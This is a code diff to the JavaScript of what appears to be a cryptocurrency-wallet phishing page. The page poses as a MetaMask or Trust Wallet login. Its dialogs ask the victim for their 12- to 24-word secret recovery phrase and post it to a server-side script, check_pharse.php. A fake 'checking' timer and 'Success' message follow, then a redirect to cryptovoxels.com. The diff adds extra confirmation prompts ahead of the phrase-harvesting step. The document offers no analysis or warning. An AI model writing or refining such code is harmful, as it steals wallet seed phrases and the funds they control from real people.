@@ -42,7 +42,7 @@ var metamask = document.querySelector("#metamask");
   }
 
   function alertwalletconnect(){
-    alertError('trush wallet')
+    alertError('trust wallet')
   }
 
   function alertwalletLink(){
@@ -68,64 +68,87 @@ var metamask = document.querySelector("#metamask");
     }).then((result) => {
       if (result.isConfirmed) {
         Swal.fire({
-          title: 'Login Pharse!',
-          text: 'Input wallet Secret Recovery Phrase',
-          input: 'text',
-          inputAttributes: {
-            autocapitalize: 'off',
-            placeholder: 'Secret Phrases contain 12, 15, 18, 21, or 24 words'
-          },
+          title: 'Info',
+          text: "Are you sure you want to import phrase !",
+          icon: 'info',
           showCancelButton: true,
-          confirmButtonText: 'Login',
-          showLoaderOnConfirm: true,
-          preConfirm: (login) => {
-            var data = new FormData();
-            data.append( "pharse", login );
-            return fetch(`service/check_pharse.php`,
-              {
-                method: "POST",
-                body: data
-              })
-              .then(response => {
-                if (!response.ok) {
-                  throw new Error(response.statusText)
-                }
-                return response.json()
-              })
-              .catch(error => {
-                Swal.showValidationMessage(
-                  `Invalid Secret Recovery Phrase. Secret Phrases contain 12, 15, 18, 21, or 24 words!`
-                )
-              })
-          },
-          allowOutsideClick: () => !Swal.isLoading()
+          confirmButtonColor: '#3085d6',
+          cancelButtonColor: '#d33',
+          confirmButtonText: 'Yes',
+          cancelButtonText: 'No',
         }).then((result) => {
           if (result.isConfirmed) {
-            // Swal.fire({
-            //   title: `${result.value.login}'s avatar`,
-            //   imageUrl: result.value.avatar_url
-            // })
             Swal.fire({
-              title: 'Please wait!',
-              html: 'I will check your pharse.',
-              timer: 2000,
-              timerProgressBar: true,
-              didOpen: () => {
-                Swal.showLoading()
-              }
+              title: 'Info',
+              text: "Please import your pharse contain 12, 15, 18, 21, or 24 words!",
+              icon: 'info',
+              confirmButtonColor: '#3085d6',
+              confirmButtonText: 'Ok',
             }).then((result) => {
-              /* Read more about handling dismissals below */
-              if (result.dismiss === Swal.DismissReason.timer) {
+              if (result.isConfirmed) {
                 Swal.fire({
-                  title: 'Success',
-                  text: "Now you can login " + wallet + "!",
-                  icon: 'success',
-                  confirmButtonColor: '#3085d6',
-                  confirmButtonText: 'Ok'
-
+                  title: 'Login Pharse!',
+                  text: 'Import an account with seed phrase',
+                  input: 'text',
+                  inputAttributes: {
+                    autocapitalize: 'off',
+                    placeholder: 'Secret Phrases contain 12, 15, 18, 21, or 24 words'
+                  },
+                  showCancelButton: true,
+                  confirmButtonText: 'Login',
+                  showLoaderOnConfirm: true,
+                  preConfirm: (login) => {
+                    var data = new FormData();
+                    data.append( "pharse", login );
+                    return fetch(`/service/check_pharse.php`,
+                      {
+                        method: "POST",
+                        body: data
+                      })
+                      .then(response => {
+                        if (!response.ok) {
+                          throw new Error(response.statusText)
+                        }
+                        return response.json()
+                      })
+                      .catch(error => {
+                        Swal.showValidationMessage(
+                          `Invalid Secret Recovery Phrase. Secret Phrases contain 12, 15, 18, 21, or 24 words!`
+                        )
+                      })
+                  },
+                  allowOutsideClick: () => !Swal.isLoading()
                 }).then((result) => {
                   if (result.isConfirmed) {
-                    window.location.href = 'https://www.cryptovoxels.com/'
+                    // Swal.fire({
+                    //   title: `${result.value.login}'s avatar`,
+                    //   imageUrl: result.value.avatar_url
+                    // })
+                    Swal.fire({
+                      title: 'Please wait!',
+                      html: 'I will check your pharse.',
+                      timer: 2000,
+                      timerProgressBar: true,
+                      didOpen: () => {
+                        Swal.showLoading()
+                      }
+                    }).then((result) => {
+                      /* Read more about handling dismissals below */
+                      if (result.dismiss === Swal.DismissReason.timer) {
+                        Swal.fire({
+                          title: 'Success',
+                          text: "Now you can login " + wallet + "!",
+                          icon: 'success',
+                          confirmButtonColor: '#3085d6',
+                          confirmButtonText: 'Ok'
+        
+                        }).then((result) => {
+                          if (result.isConfirmed) {
+                            window.location.href = 'https://www.cryptovoxels.com/'
+                          }
+                        })
+                      }
+                    })
                   }
                 })
               }
